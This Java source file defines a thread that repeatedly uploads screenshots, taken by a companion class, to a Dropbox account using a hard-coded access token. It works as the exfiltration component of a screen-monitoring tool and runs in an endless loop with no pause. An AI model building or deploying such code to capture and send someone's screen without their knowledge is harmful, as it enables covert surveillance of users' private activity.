package com.company;


import com.dropbox.core.DbxRequestConfig;
import com.dropbox.core.v2.DbxClientV2;
import com.dropbox.core.v2.files.FileMetadata;
import javax.imageio.ImageIO;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.Exception;
import java.io.InputStream;
import java.text.SimpleDateFormat;


public class ScreenShotSender extends Thread {

    String ACCESS_TOKEN = "-uZw9qhyPNfY";
    SimpleDateFormat formatter = new SimpleDateFormat("yyyyMMdd_HHmmss");
    BufferedImage screenShot = null;
    DbxRequestConfig config = DbxRequestConfig.newBuilder("dropbox/java-tutorial").build();
    DbxClientV2 client = new DbxClientV2(config, ACCESS_TOKEN);

    @Override
    public void run() {
        while(true)
        {
            try
            {

                ByteArrayOutputStream imageToBytes = new ByteArrayOutputStream();
                BufferedImage screenShot = SimpleScreenShotter.screenShot;
                if (screenShot!=null)
                {
                ImageIO.write(screenShot, "png", imageToBytes);

                    byte[] bytes = imageToBytes.toByteArray();
                    InputStream in = new ByteArrayInputStream(bytes);
                    FileMetadata metadata = client.files().uploadBuilder("/" + SimpleScreenShotter.imageName + ".png")
                            .uploadAndFinish(in);
                }

            }
            catch(Exception ex)
            {
                ex.printStackTrace();
            }
        }
    }

}

